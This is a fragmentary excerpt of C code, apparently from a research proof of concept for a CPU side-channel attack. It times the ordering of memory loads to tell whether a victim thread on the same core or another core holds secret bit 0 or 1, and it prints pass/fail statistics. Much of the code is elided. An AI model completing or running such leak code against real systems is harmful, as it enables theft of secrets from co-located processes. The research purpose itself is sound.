...
//		printf("[+] GOOD SET\n\n");
		...
		attackerAddr[30] = addrA;
		attackerAddr[31] = addrB;
		*(uint64_t *)addrA = 0;
		*(uint64_t *)addrB = 0;
		bp = &attackerAddr[31];
		bpp = &bp;
		...
		printf("\n[+][1] Single Thread Static A-B sequence:  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, ABn_AB);
		printf("[+][1] Single Thread Static B-A sequence:  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA);


		static_BA = ABn_BA;
    //printf("%d,", static_BA);
		//fflush(stdout);
		if((static_BA < 4000) || (AnB_AB < 4000)) return 0;
...
//		fflush(stdout);
		...
		printf("[+][3] Single Thread Dummy Victim (A-B):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, ABn_AB);
		printf("[+][3] Single Thread Dummy Victim (B-A):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA);
//		fflush(stdout);
...
//		if(1) printf("[+] Single Thread Victim LoadB Times: 0");
	 	...
	 	for(int m = 0; m < 10000; m++) {
			...
			if(1 && m < 100) printf(", [%d,%d]", loadB_AB, loadB_BA);
...
void* contentionfixed_victim_thread(unsigned int hdis)
{
	volatile unsigned int *s = &secret;
	volatile unsigned int **b = &brcondptr;
	volatile unsigned int *m = &mask;
...
if(0){
	...
	printf("\n\n[+][2] SMT A-B sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n", workedAB, dualAB, goneAB, sameAB, workedAB, dualAB);
	...
	printf("\n[+][2] SMT B-A sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n", dualBA, workedBA, goneBA, sameBA, workedBA, dualBA);
...
if(0){
	...
	printf("\n\n[+][2] Multi-Core A-B sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n", workedAB, dualAB, goneAB, sameAB, workedAB, dualAB);
	...
	printf("\n[+][2] Multi-Core B-A sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n", dualBA, workedBA, goneBA, sameBA, workedBA, dualBA);
...
if(1) {
  ...
  /* Multi-Core Secret 0 Victim */
	for(int x = 0; x < RUNS; x++) {  
      ...
      int loadB_time = contentionfixed_victim_thread(BRCOND);
     ...
     char fail[] = "FAIL";
     char * result;
     if(workedAB > dualAB) {result = pass; runpass[x]++;}
     else {result = fail; runfail[x]++;}
   
   	if(qq<5)printf("[+][%0.2d] Multi-Core Secret 0 Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d] + %s\n", x, workedAB, dualAB, goneAB, sameAB, workedAB, workedAB+dualAB+sameAB+goneAB, dualAB, workedAB+dualAB+sameAB+goneAB, result);
    
        if((qq%1 == 0) && (x == RUNS-1)) {for(int zz = 0; zz < RUNS; zz++) {
  ...
  /* Multi-Core Secret 1 Victim */
	for(int x = 0; x < RUNS; x++) {  
     ...
     if(workedBA > dualBA) {result = pass; runpass[x]++;}
   	...
   	if(qq<5)printf("[+][%0.2d] Multi-Core Secret 1 Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d] + %s\n", x, dualBA, workedBA, goneBA, sameBA, workedBA, workedBA+dualBA+goneBA+sameBA, dualBA, workedBA+dualBA+goneBA+sameBA, result);
